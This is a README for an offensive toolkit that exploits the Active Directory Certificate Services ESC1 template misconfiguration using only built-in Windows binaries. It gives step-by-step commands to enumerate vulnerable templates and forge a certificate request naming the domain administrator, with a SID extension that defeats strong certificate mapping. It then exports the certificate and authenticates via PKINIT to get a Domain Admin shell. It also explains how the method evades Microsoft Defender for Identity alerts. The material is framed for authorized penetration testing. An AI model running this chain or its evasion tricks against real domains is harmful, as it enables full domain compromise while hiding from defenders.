# ESC1-LOLBins

Exploit AD CS ESC1 (certificate template misconfiguration) using **only LOLBins** (Living Off The Land Binaries) — no Certify, no Certipy, no Rubeus. Everything runs with `certutil`, `certreq`, and PowerShell.

The PKINIT authentication uses the Windows API (`CreateProcessWithLogonW`), so the Kerberos AS-REQ is indistinguishable from a legitimate Windows logon. This evades Microsoft Defender for Identity (MDI) "Suspicious certificate usage over Kerberos protocol (PKINIT)" alerts, which detect Rubeus/Certipy based on their non-standard encryption type lists.

## What's in this repo

| File | Purpose |
|---|---|
| `Find-ESC1Templates.ps1` | Enumerate certificate templates vulnerable to ESC1 |
| `Get-SidExtensionHex.ps1` | Generate the SID extension hex for Strong Certificate Mapping bypass |
| `ESC1-Template.inf` | INF template for `certreq` with placeholders |
| `Invoke-RunAsWithCert.ps1` | PKINIT authentication via Windows API (domain-joined, no admin needed) |
| `Invoke-ESC1.ps1` | Full-chain wrapper: enumerate → request → auth in one command |

## Prerequisites

- Domain-joined Windows workstation
- Any domain user account (no admin required for the exploit itself)
- A certificate template vulnerable to ESC1

## What is ESC1?

A certificate template is vulnerable to ESC1 when ALL of these conditions are met:

1. **Enrollee Supplies Subject** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) is enabled
2. **Client Authentication** EKU (or Smart Card Logon / Any Purpose) is present
3. **Enrollment rights** granted to low-privilege groups (Domain Users, Authenticated Users, Everyone)
4. **Manager approval** is not required
5. **Authorized signatures** = 0

This allows any enrollee to request a certificate with an arbitrary UPN (e.g., `administrator@corp.local`) and authenticate as that user.

## Quick Start (Automated)

```powershell
# One command — does everything
.\Invoke-ESC1.ps1 `
    -CA "ca01.corp.local\CORP-CA" `
    -Template "VulnTemplate" `
    -TargetUPN "administrator@corp.local" `
    -TargetSID "S-1-5-21-1234567890-987654321-1122334455-500" `
    -Domain "CORP.LOCAL"

# A new PowerShell window opens running as Administrator
# Verify:
klist 
dir \\DC01\C$
```

## Step-by-Step (Manual)

### Step 1: Find Vulnerable Templates

**Option A — PowerShell (built-in):**

```powershell
.\Find-ESC1Templates.ps1
```

Output:
```
[!] VULNERABLE: VulnTemplate
    - Client Authentication EKU Found
    - Enrollee Supplies Subject Found
    - Manager Approval: No
    - Authorized Signatures: 0
    - Enrollable By: Domain Users
```

**Option B — BloodHound CE Cypher:**

```cypher
MATCH (ct:CertTemplate)-[:PublishedTo]->(ca:EnterpriseCA)
WHERE ct.enrolleesuppliessubject = true
  AND ct.clientauth = true
  AND ct.requiresmanagerapproval = false
  AND ct.authorizedsignatures = 0
MATCH (g)-[:Enroll|AllExtendedRights]->(ct)
WHERE g.name CONTAINS "DOMAIN USERS" OR g.name CONTAINS "AUTHENTICATED USERS" OR g.name CONTAINS "EVERYONE"
RETURN ct.name AS Template, ca.name AS CA, g.name AS EnrollableBy
```

### Step 2: Get the Target User's SID

```powershell
# Option A: With RSAT
(Get-ADUser administrator).SID.Value

# Option B: Without RSAT (LDAP query)
$searcher = [adsisearcher]"(samaccountname=administrator)"
$result = $searcher.FindOne()
(New-Object System.Security.Principal.SecurityIdentifier($result.Properties["objectsid"][0], 0)).Value

# Option C: wmic (if you already have access)
wmic useraccount where name='administrator' get sid
```

### Step 3: Generate the SID Extension Hex

```powershell
.\Get-SidExtensionHex.ps1 -SidString "S-1-5-21-1234567890-987654321-1122334455-500"
```

Output:
```
[*] SID string : S-1-5-21-1234567890-987654321-1122334455-500 (47 chars)
[*] DER hex    : 3041a03f060a2b060104018237190201a031042f532d312d352d...

[*] INF extension line:
1.3.6.1.4.1.311.25.2 = "{hex}3041a03f060a2b060104018237190201a031042f532d312d352d..."
```

### Step 4: Create the Certificate Request INF

Copy `ESC1-Template.inf` and fill in the placeholders:

```ini
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN=youruser"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[RequestAttributes]
CertificateTemplate = VulnTemplate

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=administrator@corp.local"
1.3.6.1.4.1.311.25.2 = "{hex}3041a03f060a2b060104018237190201a031042f532d312d352d..."
```

> **Note:** The `Subject` CN should be **your own username** (the requester), not the target. The target identity goes in the SAN (UPN) and SID extension.

> **Note:** The `CertificateTemplate` value must have **no spaces**. If the template name is "Admin User", use `AdminUser`.

### Step 5: Generate and Submit the CSR

```powershell
# Generate the CSR
certreq -new ESC1.inf ESC1.req

# Submit to the CA
certreq -submit -config "ca01.corp.local\CORP-CA" ESC1.req ESC1.cer

# Accept the issued certificate
certreq -accept ESC1.cer
```

### Step 6: Export as PFX

```powershell
# Export with empty password
certutil -exportPFX -user My "administrator" admin.pfx ""
```

### Step 7: Authenticate via PKINIT

```powershell
# Load the function
. .\Invoke-RunAsWithCert.ps1

# Authenticate — spawns a new PowerShell window as Administrator
Invoke-RunAsWithCert admin.pfx -Domain CORP.LOCAL
```

### Step 8: Verify

In the new PowerShell window:

```powershell
# List DC C: drive — proves Domain Admin
dir \\DC01\C$

# Check identity
whoami
klist
```

## Strong Certificate Mapping (KB5014754)

Since February 2025, Microsoft enforces **Strong Certificate Mapping** by default. The KDC rejects certificates that don't include a SID extension matching the target account's SID.

`Get-SidExtensionHex.ps1` generates the DER-encoded hex for OID `1.3.6.1.4.1.311.25.2` (`szOID_NTDS_CA_SECURITY_EXT`). This is embedded in the certificate via the INF `[Extensions]` section and satisfies the strong mapping check.

Without this, you'll get `KDC_ERR_CERTIFICATE_MISMATCH`.

## Why MDI Doesn't Detect This

Microsoft Defender for Identity detects PKINIT abuse by inspecting the AS-REQ encryption type list (`etype` field in `KDC-REQ-BODY`):

| Tool | etype list | Detected? |
|---|---|---|
| Rubeus | `AES256, AES128` | **Yes** |
| Certipy | `AES256, AES128` | **Yes** |
| `Invoke-RunAsWithCert.ps1` | Full Windows etype list | **No** |

`Invoke-RunAsWithCert.ps1` uses `CreateProcessWithLogonW`, which delegates PKINIT to the Windows Kerberos SSP (`kerberos.dll`). The AS-REQ is built by the OS with the full legitimate encryption type list, making it indistinguishable from a normal Windows smartcard logon.

Reference: [Synacktiv — Understanding and evading MDI PKINIT detection](https://www.synacktiv.com/publications/understanding-and-evading-microsoft-defender-for-identity-pkinit-detection)

## Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `certreq -submit` fails with "RPC server unavailable" | Can't reach the CA on port 135 | Check `Test-NetConnection -ComputerName CA_HOST -Port 135` |
| `CERTSRV_E_TEMPLATE_DENIED` | Template not published to this CA, or you're not in the enrollment group | Verify with `certutil -CATemplates` |
| `KDC_ERR_CERTIFICATE_MISMATCH` | SID extension missing or wrong | Re-run `Get-SidExtensionHex.ps1` with the correct SID |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | CA not in NTAuthStore | Check with `certutil -store -enterprise NTAuth` |
| `CreateProcessWithLogonW failed: 0x5` | Access denied (rare) | Run from an elevated prompt |
| Template name not found by certreq | Name has spaces or wrong case | Remove spaces in INF: "Admin User" → `AdminUser` |
| `certutil -exportPFX` can't find cert | Cert not in Personal store | Run `certutil -user -store My` to list, export by thumbprint instead |

## NTAuthStore Verification

Only CAs registered in NTAuthStore are trusted for PKINIT. Verify:

```powershell
certutil -store -enterprise NTAuth
```

If the target CA is listed, PKINIT works. If not, you'll need Schannel authentication instead (out of scope for this tool — use [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)).

## Credits

- [SpecterOps — Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) (Will Schroeder & Lee Chagolla-Christensen)
- [Synacktiv — Invoke-RunAsWithCert](https://github.com/synacktiv/Invoke-RunAsWithCert) (Guillaume Andre)
- [ShkudW — ESC1_Build_In_Script](https://github.com/ShkudW/ESC1_Build_In_Script)
- [Aura InfoSec — Modifying Certipy to Evade MDI](https://research.aurainfosec.io/pentest/modifying-certipy-to-evade-mdi-pkinit-detection/)

## Disclaimer

This tool is provided for authorized security testing, penetration testing engagements, and educational purposes only. Do not use this tool against systems you do not have explicit authorization to test. The authors are not responsible for misuse.
